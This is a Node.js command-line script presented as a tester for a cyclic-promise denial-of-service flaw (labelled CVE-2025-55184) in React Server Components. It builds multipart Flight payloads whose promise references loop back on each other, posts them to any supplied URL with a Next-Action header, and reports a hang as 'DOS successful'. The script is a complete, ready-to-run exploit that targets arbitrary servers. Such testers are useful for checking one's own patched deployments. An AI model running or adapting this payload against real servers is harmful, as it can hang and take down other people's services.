/**
 * React Flight Protocol - Cyclic Promise DOS Test (CVE-2025-55184)
 *
 * Tests for the cyclic thenable vulnerability in React Server Components.
 * The Flight protocol fails to detect cycles in custom Thenables, causing
 * infinite loops when Promise A resolves to Promise B which resolves back to A.
 *
 * @see https://github.com/facebook/react/pull/35345
 */

const http = require('http');
const https = require('https');

/**
 * Creates a cyclic promise DOS payload for React Flight protocol
 * @param {string} boundary - Multipart boundary string
 * @returns {Buffer} - The malicious payload
 */
function createCyclicPayload(boundary) {
  const parts = [
    `--${boundary}`,
    'Content-Disposition: form-data; name="0"',
    '',
    '"$@1"',
    `--${boundary}`,
    'Content-Disposition: form-data; name="1"',
    '',
    '"$@0"',
    `--${boundary}--`,
    ''
  ];

  // Use CRLF line endings as per HTTP spec
  return Buffer.from(parts.join('\r\n'));
}

/**
 * Creates a more complex cyclic payload with multiple promise chains
 * @param {string} boundary - Multipart boundary string
 * @returns {Buffer} - The malicious payload
 */
function createComplexCyclicPayload(boundary) {
  const parts = [
    `--${boundary}`,
    'Content-Disposition: form-data; name="0"',
    '',
    '{"promise":"$@1","data":"test"}',
    `--${boundary}`,
    'Content-Disposition: form-data; name="1"',
    '',
    '"$@2"',
    `--${boundary}`,
    'Content-Disposition: form-data; name="2"',
    '',
    '"$@0"',
    `--${boundary}--`,
    ''
  ];

  return Buffer.from(parts.join('\r\n'));
}

/**
 * Tests a target URL for the cyclic promise DOS vulnerability
 * @param {string} targetUrl - The URL to test
 * @param {object} options - Test options
 * @param {number} options.timeout - Request timeout in ms (default: 10000)
 * @param {boolean} options.complex - Use complex payload (default: false)
 * @param {string} options.actionId - Server Action ID header value
 * @returns {Promise<object>} - Test result
 */
async function testDOS(targetUrl, options = {}) {
  const {
    timeout = 10000,
    complex = false,
    actionId = 'test-action-id'
  } = options;

  const url = new URL(targetUrl);
  const boundary = 'CyclicDOSTest' + Date.now();
  const payload = complex
    ? createComplexCyclicPayload(boundary)
    : createCyclicPayload(boundary);

  const httpModule = url.protocol === 'https:' ? https : http;

  const requestOptions = {
    hostname: url.hostname,
    port: url.port || (url.protocol === 'https:' ? 443 : 80),
    path: url.pathname + url.search,
    method: 'POST',
    timeout,
    headers: {
      'Content-Type': `multipart/form-data; boundary=${boundary}`,
      'Accept': 'text/x-component',
      'Next-Action': actionId,
      'Content-Length': payload.length
    }
  };

  return new Promise((resolve) => {
    const startTime = Date.now();

    const req = httpModule.request(requestOptions, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        resolve({
          vulnerable: false,
          status: res.statusCode,
          time: Date.now() - startTime,
          response: body,
          message: 'Server responded normally - likely patched'
        });
      });
    });

    req.on('timeout', () => {
      req.destroy();
      resolve({
        vulnerable: true,
        status: null,
        time: timeout,
        response: null,
        message: `Request timed out after ${timeout}ms - server may be hung (DOS successful)`
      });
    });

    req.on('error', (err) => {
      resolve({
        vulnerable: err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT',
        status: null,
        time: Date.now() - startTime,
        response: null,
        error: err.message,
        message: err.code === 'ECONNREFUSED'
          ? 'Connection refused - server not running'
          : `Request error: ${err.message}`
      });
    });

    req.write(payload);
    req.end();
  });
}

/**
 * Checks if server is still responsive after DOS attempt
 * @param {string} targetUrl - The URL to check
 * @param {number} timeout - Timeout in ms
 * @returns {Promise<boolean>} - True if server responds
 */
async function checkServerAlive(targetUrl, timeout = 5000) {
  const url = new URL(targetUrl);
  const httpModule = url.protocol === 'https:' ? https : http;

  return new Promise((resolve) => {
    const req = httpModule.get(targetUrl, { timeout }, (res) => {
      res.on('data', () => {});
      res.on('end', () => resolve(true));
    });

    req.on('timeout', () => {
      req.destroy();
      resolve(false);
    });

    req.on('error', () => resolve(false));
  });
}

/**
 * Main CLI entry point
 */
async function main() {
  const args = process.argv.slice(2);

  if (args.length === 0 || args.includes('--help') || args.includes('-h')) {
    console.log(`
React Flight Cyclic Promise DOS Tester (CVE-2025-55184)

Usage:
  node react-flight-dos.cjs <url> [options]

Options:
  --timeout <ms>    Request timeout (default: 10000)
  --complex         Use complex multi-chain payload
  --check-after     Check if server is alive after test
  --help, -h        Show this help

Examples:
  node react-flight-dos.cjs http://localhost:3000
  node react-flight-dos.cjs http://localhost:3000 --timeout 15000 --check-after
`);
    process.exit(0);
  }

  const targetUrl = args[0];
  const timeout = args.includes('--timeout')
    ? parseInt(args[args.indexOf('--timeout') + 1])
    : 10000;
  const complex = args.includes('--complex');
  const checkAfter = args.includes('--check-after');

  console.log('╔════════════════════════════════════════════════════════════╗');
  console.log('║  React Flight Cyclic Promise DOS Test (CVE-2025-55184)     ║');
  console.log('╚════════════════════════════════════════════════════════════╝\n');

  console.log(`Target:  ${targetUrl}`);
  console.log(`Timeout: ${timeout}ms`);
  console.log(`Payload: ${complex ? 'Complex (3-chain cycle)' : 'Simple (2-chain cycle)'}\n`);

  console.log('Sending cyclic promise payload...\n');

  const result = await testDOS(targetUrl, { timeout, complex });

  console.log('─'.repeat(60));
  console.log('Result:', result.message);
  console.log('─'.repeat(60));

  if (result.vulnerable) {
    console.log('\n⚠️  VULNERABLE: Server appears to be affected by CVE-2025-55184');
    console.log('   The cyclic promise payload caused the server to hang.\n');
  } else if (result.status) {
    console.log(`\n✓  Server responded with status ${result.status}`);
    if (result.response) {
      console.log('   Response preview:', result.response.slice(0, 200));
    }
  }

  if (checkAfter) {
    console.log('\nChecking if server is still responsive...');
    const alive = await checkServerAlive(targetUrl);
    console.log(alive
      ? '✓  Server is still responding'
      : '✗  Server is NOT responding - DOS successful'
    );
  }

  // Exit with code 1 if vulnerable
  process.exit(result.vulnerable ? 1 : 0);
}

// Export for programmatic use
module.exports = {
  testDOS,
  checkServerAlive,
  createCyclicPayload,
  createComplexCyclicPayload
};

// Run CLI if executed directly
if (require.main === module) {
  main().catch(console.error);
}
